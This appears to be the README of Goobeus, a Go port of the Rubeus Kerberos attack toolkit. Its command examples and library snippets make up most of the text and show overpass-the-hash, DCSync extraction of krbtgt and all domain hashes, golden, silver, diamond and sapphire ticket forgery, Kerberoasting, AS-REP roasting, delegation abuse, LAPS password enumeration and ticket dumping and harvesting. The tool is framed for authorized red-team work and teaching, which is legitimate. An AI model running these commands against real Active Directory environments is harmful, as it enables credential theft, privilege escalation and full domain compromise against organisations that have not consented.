# Goobeus

![Goobeus](goobeus.jpg)

A comprehensive Go implementation of [Rubeus](https://github.com/GhostPack/Rubeus) for Kerberos manipulation, designed for both Windows and Linux.

> **Educational Focus**: Every function includes detailed documentation explaining the underlying Kerberos concepts, RFC references, and security implications. This tool is designed to teach Kerberos while providing red team capabilities.

## Features

| Category | Commands | Description |
|----------|----------|-------------|
| **TGT Operations** | `asktgt` | Request TGT with password, NTLM hash, or AES keys |
| **Service Tickets** | `asktgs` | Request TGS for specific SPNs |
| **Delegation** | `s4u`, `rbcd`, `constrained` | S4U2Self/S4U2Proxy, Resource-Based Constrained Delegation |
| **Ticket Management** | `describe`, `ptt`, `dump`, `triage`, `klist`, `purge`, `tgtdeleg`, `monitor`, `harvest` | View, import, export, and manage Kerberos tickets |
| **Forgery** | `golden`, `silver`, `diamond`, `sapphire` | Forge tickets with various techniques |
| **Roasting** | `kerberoast`, `asreproast` | Extract crackable hashes |
| **Credential Extraction** | `dcsync` | DCSync attack via MS-DRSR replication |
| **ADWS Enumeration** | `enumerate` | Active Directory Web Services enumeration |
| **Utilities** | `hash`, `changepw`, `createnetonly`, `currentluid` | Password hashing, Kerberos password change, and session utilities |

## Quick Start

### Build

```bash
# Build for Windows
GOOS=windows GOARCH=amd64 go build -o goobeus.exe ./cmd/goobeus

# Build for Linux  
go build -o goobeus ./cmd/goobeus
```

### Global Flags

```
-d, --domain    Domain name
-u, --user      Username
-p, --pass      Password
-r, --rc4       NT hash (RC4)
-a, --aes       AES256 key
-t, --ticket    Ticket file or base64
-k, --kdc       KDC address
-o, --out       Output file
-f, --format    Output format (kirbi, ccache, base64)
-v, --verbose   Verbose output
```

## Command Reference

### TGT Operations

```bash
# Request TGT with password
goobeus -d corp.local -u jsmith -p 'Password123!' asktgt

# Request TGT with NTLM hash (overpass-the-hash)
goobeus -d corp.local -u jsmith -r aad3b435b51404eeaad3b435b51404ee asktgt

# Request TGT with AES256 key
goobeus -d corp.local -u jsmith -a <aes256_key> asktgt

# Export as .ccache (for Linux tools like Impacket)
goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.ccache asktgt

# Export as .kirbi (for Windows tools)
goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.kirbi asktgt
```

### DCSync

Extract credentials from a Domain Controller using the MS-DRSR replication protocol.

**Required Privileges**: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`  
**Default Holders**: Domain Admins, Enterprise Admins, Domain Controllers

```bash
# DCSync single user (extract krbtgt for Golden Ticket attacks)
goobeus -d corp.local -u admin -p 'Password!' dcsync --user krbtgt --dc dc01.corp.local

# DCSync ALL domain users (like secretsdump.py)
goobeus -d corp.local -u admin -p 'Password!' dcsync --all --dc dc01.corp.local

# Use NT hash for authentication
goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.local
```

**DCSync Flags:**

- `--user <username>` - Target user to extract (e.g., krbtgt, Administrator)
- `--dc <hostname>` - Domain Controller hostname/IP
- `--all` - Dump all domain users (like secretsdump -just-dc)

> **Output**: Returns NT hash, AES256, and AES128 keys for extracted users. The AES256 key from krbtgt is perfect for Diamond/Sapphire ticket forging!

### Ticket Forgery

```bash
# Forge Golden Ticket
goobeus golden --domain corp.local --sid S-1-5-21-... --krbtgt <hash> --user fakeadmin

# Forge Silver Ticket  
goobeus silver --domain corp.local --sid S-1-5-21-... --rc4 <svc_hash> \
  --service cifs/fileserver.corp.local --user admin

# Forge Diamond Ticket (modify real TGT's PAC)
goobeus -d corp.local -u lowpriv -p 'Password!' diamond \
  --krbtgt <krbtgt_aes256> --impersonate Administrator

# Forge Sapphire Ticket (real PAC via S4U2Self+U2U)
goobeus -d corp.local -u lowpriv -p 'LowPrivPass!' sapphire \
  --krbtgt <krbtgt_aes256> --impersonate Administrator \
  --sid S-1-5-21-... -o admin.ccache
```

> **Sapphire Tickets**: The most advanced ticket forgery technique. Uses S4U2Self with User-to-User authentication to obtain a real PAC from the target user, then transplants it into a forged TGT. The resulting ticket contains genuine group memberships from Active Directory, making it harder to detect than Golden/Diamond tickets.

### Roasting Attacks

```bash
# Kerberoast - extract TGS hashes for offline cracking
goobeus -d corp.local -u user -p 'Password!' kerberoast --dc dc01.corp.local

# Kerberoast specific SPN
goobeus kerberoast --spn MSSQLSvc/sql01.corp.local:1433

# AS-REP Roast users without pre-authentication
goobeus asreproast --domain corp.local --dc dc01.corp.local --users users.txt
```

### Delegation Attacks

```bash
# S4U2Self + S4U2Proxy constrained delegation
goobeus -d corp.local -u svc_sql -r <hash> s4u \
  --impersonate administrator --msdsspn cifs/dc01.corp.local

# Resource-Based Constrained Delegation (RBCD) attack
goobeus -d corp.local -t machine.kirbi rbcd --action attack \
  --spn cifs/target.corp.local --impersonate Administrator

# Configure RBCD (add SID to msDS-AllowedToActOnBehalfOfOtherIdentity)
goobeus -d corp.local rbcd --action write --target CN=TARGET,... --sid S-1-5-21-...

# Standard constrained delegation attack
goobeus -d corp.local -t svc_account.kirbi constrained \
  --impersonate administrator --spn cifs/target.corp.local

# Use alternative service class
goobeus constrained --spn http/target.corp.local --altservice ldap ...
```

**RBCD Flags:**

- `--action <read|write|attack|clear>` - Action to perform (default: read)
- `--target <DN>` - Target computer distinguished name
- `--sid <SID>` - Machine account SID to add
- `--impersonate <user>` - User to impersonate (default: Administrator)
- `--spn <SPN>` - Target SPN for attack action

**Constrained Delegation Flags:**

- `--impersonate <user>` - User to impersonate (default: Administrator)
- `--spn <SPN>` - Target SPN from msDS-AllowedToDelegateTo
- `--altservice <service>` - Alternative service class (e.g., ldap, http)

### ADWS Enumeration

Enumerate Active Directory via ADWS (port 9389) - no LDAP required:

```bash
# List available enumeration modes
goobeus enumerate

# BloodHound-compatible JSON collection
goobeus -d corp.local enumerate bloodhound

# Enumerate users with SPNs (Kerberoast targets)
goobeus -d corp.local enumerate spn

# Enumerate AS-REP roastable users
goobeus -d corp.local enumerate asrep

# Enumerate delegation configurations
goobeus -d corp.local enumerate delegation

# Enumerate LAPS passwords
goobeus -d corp.local enumerate laps

# Enumerate gMSA accounts
goobeus -d corp.local enumerate gmsa

# Enumerate privileged groups (Domain Admins, Enterprise Admins, etc.)
goobeus -d corp.local enumerate groups

# Enumerate computers (with OS breakdown)
goobeus -d corp.local enumerate computers
```

**Enumeration Modes:**

| Mode | Description |
|------|-------------|
| `bloodhound` | BloodHound collection (ZIP with JSON) |
| `spn` | Kerberoastable accounts |
| `asrep` | AS-REP roastable accounts |
| `delegation` | Delegation configurations (unconstrained, constrained, RBCD) |
| `laps` | LAPS passwords (if readable) |
| `gmsa` | gMSA accounts |
| `groups` | Privileged group members |
| `computers` | All computers with OS statistics |

### Ticket Management

```bash
# Describe ticket contents
goobeus describe --ticket admin.kirbi
goobeus describe --ticket admin.ccache

# Convert between formats
goobeus describe --ticket admin.kirbi --out admin.ccache

# Hash password to Kerberos keys
goobeus hash --password 'Password123!' --domain corp.local --user jsmith

# Change password via kpasswd
goobeus -d corp.local -u jsmith -p 'OldPass!' changepw --new 'NewPass123!'
```

### Windows-Specific Commands

These commands interact with the Windows Kerberos credential cache and require running on Windows:

```bash
# Pass-the-ticket (inject into current session)
goobeus.exe ptt --ticket admin.kirbi

# Dump tickets from current session
goobeus.exe dump

# Dump all tickets (requires elevation)
goobeus.exe dump --all

# Triage/list cached tickets (aliases for dump)
goobeus.exe triage
goobeus.exe klist

# Purge tickets from cache
goobeus.exe purge

# Extract TGT via delegation trick
goobeus.exe tgtdeleg --spn cifs/dc01.corp.local

# Monitor for new TGTs
goobeus.exe monitor --interval 30s

# Harvest new TGTs automatically
goobeus.exe harvest --interval 30s

# Get current logon session LUID
goobeus.exe currentluid

# Create process with network-only credentials
goobeus.exe createnetonly --program cmd.exe --domain corp.local \
  --user admin --password "Pass123!"
```

## Library Usage

Goobeus is designed as a library first. You can import individual packages:

```go
import (
    "github.com/goobeus/goobeus/pkg/client"
    "github.com/goobeus/goobeus/pkg/ticket"
    "github.com/goobeus/goobeus/pkg/forge"
    "github.com/goobeus/goobeus/pkg/dcsync"
)

// Request a TGT
result, err := client.AskTGT(&client.TGTRequest{
    Domain:   "corp.local",
    Username: "jsmith",
    Password: "Password123!",
})

// Save as .kirbi
ticket.SaveKirbi(result.Kirbi, "jsmith.kirbi")

// Or convert to .ccache for Linux tools
ticket.SaveCCache(result.Kirbi, "jsmith.ccache")

// Forge a Sapphire Ticket
sapphireResult, err := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketRequest{
    Domain:       "corp.local",
    DomainSID:    "S-1-5-21-...",
    Username:     "lowpriv",
    Password:     "LowPrivPass!",
    Impersonate:  "Administrator",
    KrbtgtAES256: krbtgtKey,
    KDC:          "dc01.corp.local",
})

// DCSync to extract credentials
dcResult, err := dcsync.DCSync(ctx, &dcsync.DCSyncRequest{
    DC:         "dc01.corp.local",
    Domain:     "corp.local",
    Username:   "admin",
    Password:   "Password!",
    TargetUser: "krbtgt",
})
// dcResult.NTHash, dcResult.AES256, dcResult.AES128
```

## Ticket Formats

| Format | Extension | Use Case |
|--------|-----------|----------|
| kirbi | `.kirbi` | Windows tools (Mimikatz, Rubeus) |
| ccache | `.ccache` | Linux tools (Impacket, krb5) |
| base64 | - | Command-line passing, embedding |

Both formats are fully supported for input and output. Output format is auto-detected from file extension.

## Credential Input Formats

| Format | Flag | Example |
|--------|------|---------|
| Password | `-p, --pass` | `-p "Password123!"` |
| NTLM Hash | `-r, --rc4` | `-r aad3b435b51404eeaad3b435b51404ee` |
| AES128 Key | `--aes128` | `--aes128 <32 hex chars>` |
| AES256 Key | `-a, --aes` | `-a <64 hex chars>` |
| Ticket File | `-t, --ticket` | `-t admin.kirbi` |

## Hash Output Formats

Roasting commands support multiple output formats:

```bash
# Hashcat format (default)
goobeus kerberoast --format hashcat

# John the Ripper format
goobeus kerberoast --format john
```

Hashcat modes:

- `13100` - Kerberoast RC4
- `19600` - Kerberoast AES128  
- `19700` - Kerberoast AES256
- `18200` - AS-REP Roast

## Documentation

See the [docs/](docs/) directory for in-depth educational content:

- [KERBEROS_101.md](docs/KERBEROS_101.md) - Kerberos fundamentals
- [ENCRYPTION.md](docs/ENCRYPTION.md) - Encryption types deep dive
- [TICKETS.md](docs/TICKETS.md) - Ticket structure and formats
- [ATTACKS.md](docs/ATTACKS.md) - Attack techniques explained
- [DELEGATION.md](docs/DELEGATION.md) - Delegation abuse
- [DCSYNC.md](docs/DCSYNC.md) - DCSync attack internals
- [SAPPHIRE.md](docs/SAPPHIRE.md) - Sapphire ticket deep dive (implementation details, protocol flows, debugging)
- [TGTDELEG_IMPLEMENTATION.md](docs/TGTDELEG_IMPLEMENTATION.md) - TGT delegation implementation

## Package Structure

```
pkg/
├── adws/       # ADWS enumeration (port 9389)
├── asn1krb5/   # ASN.1 Kerberos message structures
├── client/     # Kerberos protocol client (AS-REQ, TGS-REQ, etc.)
├── crypto/     # Kerberos encryption (RC4, AES128, AES256)
├── dcsync/     # DCSync via MS-DRSR replication
├── delegation/ # S4U2Self, S4U2Proxy, RBCD
├── forge/      # Golden, Silver, Diamond, Sapphire tickets
├── pac/        # PAC parsing and creation
├── roast/      # Kerberoast, AS-REP roast
├── ticket/     # .kirbi and .ccache handling
└── windows/    # Windows-specific APIs (LSA, SSPI)
```

## Credits

- [Rubeus](https://github.com/GhostPack/Rubeus) by @harmj0y - Original C# implementation
- [gokrb5](https://github.com/jcmturner/gokrb5) - Go Kerberos library (reference)
- [Impacket](https://github.com/fortra/impacket) - Python Kerberos tools (reference)
- Charlie Clark's research on Diamond and Sapphire tickets

## Legal

This tool is intended for authorized security testing and research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
